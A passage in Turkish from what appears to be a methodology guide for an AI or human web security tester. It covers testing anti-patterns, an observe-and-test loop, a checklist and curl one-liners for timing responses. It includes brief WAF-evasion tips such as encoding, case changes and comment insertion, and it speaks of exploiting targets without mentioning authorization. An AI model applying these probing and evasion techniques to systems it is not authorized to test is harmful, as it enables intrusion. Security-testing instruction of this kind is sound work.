❌ **Yanlış:** Bir sürü payload'ı arka arkaya gönderip sadece HTTP durum koduna bakmak.

✅ **Doğru:** Her payload için: HTTP durumu, yanıt süresi, yanıt boyutu, yanıt başlıkları, yanıt gövdesindeki değişiklikleri BELGELE. İki yanıt arasındaki 10 byte'lık fark, bir zaafiyetin tek göstergesi olabilir. Gözlemlemeden anlayamazsın.

### 6.6 Tek Hipotez Tuzağı (Single Hypothesis Trap)

❌ **Yanlış:** "SQL injection var, sadece ona odaklanayım."

✅ **Doğru:** Bir girdi birden fazla zaafiyete sahip olabilir. Aynı girdi hem XSS'e hem SQLi'ye hem SSTI'ye açık olabilir. TÜM hipotezleri listele, önceliklendir, sırayla test et. Bir zaafiyet buldun diye diğerlerini atlama.

### 6.7 Doğrulama Yorgunluğu (Validation Fatigue)

❌ **Yanlış:** 3. girdiden sonra "bunlarda bir şey yok herhalde" deyip yüzeysel geçmek.

✅ **Doğru:** Her girdi eşit derecede önemlidir. En kritik zaafiyet, en beklenmedik girdide olabilir. `name="returnUrl"` görünüşte zararsız bir hidden input, açık yönlendirmeye yol açabilir. `name="sortBy"` bir dropdown, SQL injection'a açık olabilir. HER GİRDİYE AYNI ÖZENİ GÖSTER.

### 6.8 Anti-Patern Özet Tablosu

| Anti-Patern | Semptom | Sonuç | Düzeltme |
|------------|---------|-------|----------|
| Erken yargı | İsimden teknoloji tahmini | Yanlış zaafiyet sınıfına odaklanma | Gözlemle, sonra yargıla |
| Bağlamsız test | Her yere `<script>` gönderme | Yanlış negatif (XSS var ama tespit edilemedi) | Bağlamı tespit et, bağlama uygun payload kullan |
| DB varsayımı | Her yere MySQL payload'ı | Yanlış negatif (farklı DB, farklı sözdizimi) | Hata mesajından/timing'den DB tespit et |
| Header'a kör inanç | Server header'ına göre test | Yanlış pozitif/negatif | Davranışsal doğrulama yap |
| Gözlemsiz test | Sadece status code kontrolü | Zaafiyeti kaçırma | Tüm metrikleri belgele |
| Tek hipotez | İlk bulguya odaklanma | Diğer zaafiyetleri kaçırma | Tüm hipotezleri listele |
| Doğrulama yorgunluğu | İlk birkaç girdiden sonra gevşeme | Kritik zaafiyeti kaçırma | Her girdiye eşit özen |

---

## BÖLÜM 7: ÖZET — GÖZLEM DÖNGÜSÜ

Bu yeteneğin özü, tek bir döngüdür:

```
┌──────────────────────────────────────────────────────┐
│                                                      │
│  1. GÖZLEMLE  →  2. ANLA  →  3. HİPOTEZ ÜRET        │
│       ↑                                      ↓       │
│       │                                      │       │
│  5. BELGELE  ←  4. TEST ET  ←───────────────┘       │
│                                                      │
└──────────────────────────────────────────────────────┘
```

Her adım bir öncekine bağlıdır. Hiçbir adım atlanamaz.

- **Gözlemle:** 5 katmanı uygula. Yapısal, zararsız, uç, tip ihlali gözlemlerini yap.
- **Anla:** Gözlemlerini yorumla. Hata mesajlarından teknolojiyi, zamanlamadan işleyişi, yansımadan bağlamı çıkar.
- **Hipotez Üret:** Gözlemlerini zaafiyet hipotezlerine dönüştür. Önceliklendir.
- **Test Et:** En yüksek öncelikli hipotezden başlayarak, bilimsel yöntemle test et. Her testi belgele.
- **Belgele:** Her şeyi, HER ŞEYİ belgele. Belgelemediğin gözlem, yapılmamış gözlemdir.

---

## BÖLÜM 8: SIK SORULAN SORULAR

**S: Bu kadar detaylı gözlem yapmak çok zaman almaz mı?**

C: Evet, zaman alır. Ama rastgele payload atıp "burada bir şey yok" demekten DAHA HIZLIDIR. Çünkü rastgele testte zaafiyeti kaçırma olasılığın yüksektir ve kaçırdığın zaafiyeti asla bilemezsin. Metodik gözlemde ise her şeyi belgelediğin için, zaafiyet varsa MUTLAKA tespit edersin. Dakikalar içinde sonuç alırsın. Rastgele testte saatler harcayıp hiçbir şey bulamayabilirsin.

**S: Her girdi için 5 katmanı uygulamak zorunda mıyım?**

C: Evet. Özellikle ilk 10 girdi için MUTLAKA. İlk 10 girdiden sonra sistemin davranış kalıplarını öğrenmiş olursun. Aynı kalıbı gösteren girdiler için katmanları hızlandırabilirsin. Ama yeni bir davranış gördüğünde, tekrar tam protokole dön.

**S: WAF/IPS her şeyi engelliyorsa ne yapmalıyım?**

C: WAF'ın varlığı, arkasında zaafiyet olmadığı anlamına gelmez. WAF bypass tekniklerini dene: encoding (URL, Unicode, base64), case manipulation, yorum ekleme (`/**/`), alternatif sözdizimi. Ama önce WAF'ın NEYİ engellediğini anla. Hangi karakterler? Hangi pattern'ler? WAF'ın kendisi bir bilgi kaynağıdır — sana arkada neyin hassas olduğunu söyler.

**S: Bu yeteneği hangi durumlarda kullanmalıyım?**

C: Şu durumlarda:
- Yeni bir hedefe başlarken
- Yeni bir endpoint/girdi keşfettiğinde
- Bir girdinin davranışından emin olmadığında
- "Burada bir şey yok" demeden önce
- Bulgularını raporlamadan önce (her bulgu gözlem kanıtına dayanmalı)
- Bir zaafiyeti exploit etmeden ÖNCE (exploit stratejisi gözleme dayanmalı)

---

## BÖLÜM 9: HIZLI REFERANS KARTI

### curl ile Gözlem Tek Satırları

```bash
# Temel gözlem (süre, durum, boyut)
curl -s -o /dev/null -w "Durum: %{http_code} | Süre: %{time_total}s | Boyut: %{size_download}" "URL"

# Tam zamanlama dökümü
curl -s -o /dev/null -w "\nDNS: %{time_namelookup}s\nConnect: %{time_connect}s\nTLS: %{time_appconnect}s\nTTFB: %{time_starttransfer}s\nToplam: %{time_total}s\n" "URL"

# Yanıtı kaydet + başlıkları kaydet + metrikleri göster
curl -s -o /tmp/body.txt -D /tmp/headers.txt -w "\n→ %{http_code} | %{time_total}s | %{size_download} byte" "URL"

# Takip eden yönlendirmelerle birlikte
curl -s -o /tmp/body.txt -D /tmp/headers.txt -w "\n→ %{http_code} | %{time_total}s | %{size_download} byte | Yönlendirme: %{redirect_url}" -L "URL"
```

### Hızlı Kontrol Listesi

Her girdi için bu listeyi işaretle:

- [ ] Katman 1: İsim, tip, DOM konumu, doğrulama, olaylar belgelendi
- [ ] Katman 2: Zararsız değer gönderildi, baseline metrikleri alındı
- [ ] Katman 2: Değerin yanıttaki tam konumu tespit edildi
- [ ] Katman 3: Boş, uzun, HTML karakterleri, Unicode test edildi
- [ ] Katman 3: En az 5 farklı uç değer test edildi
- [ ] Katman 4: Beklenen tipin dışında değer gönderildi
- [ ] Katman 4: Hata mesajlarından teknoloji yığını tespit edildi
- [ ] Katman 5: En az 3 hipotez üretildi
- [ ] Katman 5: Hipotezler önceliklendirildi
- [ ] Yanıt karşılaştırması yapıldı (baseline vs test)
- [ ] Zamanlama analizi yapıldı (en az 3 tekrar)
- [ ] Bağlam tespiti yapıldı (HTML/Attribute/JS/CSS/URL/JSON)
- [ ] Tüm gözlemler günlük formatında belgelendi

---

## BÖLÜM 10: SON SÖZ

Bu yetenek sana bir şey öğretmek için yazıldı: **Güvenlik testi, saldırmak değil; anlamaktır.**

Saldırı, anlamanın doğal bir sonucudur. Bir sistemi gerçekten anladığında, onu nasıl kıracağını da bilirsin. Ama anlamadan kırmaya çalışırsan, sadece gürültü yaparsın.

Bir güvenlik araştırmacısı olarak senin işin, sistemin sana anlattıklarını dinlemektir. Her HTTP yanıtı bir hikaye anlatır. Her hata mesajı bir ipucudur. Her milisaniyelik gecikme bir itiraftır.

Dinlemeyi öğren. Sonra konuş.

**Ve asla unutma: Sen bir script değilsin. Sen bir dedektifsin.**
